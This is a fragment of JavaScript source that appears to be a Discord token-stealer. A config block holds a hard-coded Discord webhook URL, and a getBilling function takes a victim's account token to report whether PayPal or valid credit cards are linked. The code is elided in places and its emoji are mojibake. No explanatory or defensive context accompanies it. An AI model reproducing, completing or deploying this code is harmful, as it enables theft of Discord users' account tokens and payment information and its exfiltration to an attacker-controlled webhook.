...
var config = {
    ...
    webhook: "https://discord.com/api/webhooks/994564416358064179/bkoXQMOQa3j2epuTVXp3nGaJKTVAaAynBnFU6maRT5433R61bQAawxNtsVq23SbrmAJ5",
...
async function getBilling(token) {
    ...
    json.forEach(z => {
        if (z.type == "") {
            ...
            billing += "\`âœ”ï¸ڈ\`" + " <:paypal:896441236062347374>";
        } else if (z.type == 1 && z.invalid != true) {
            billing += "\`âœ”ï¸ڈ\`" + " :credit_card:";
        } else {
            return "\`\`\`â‌Œ\`\`\`";
        };
    });
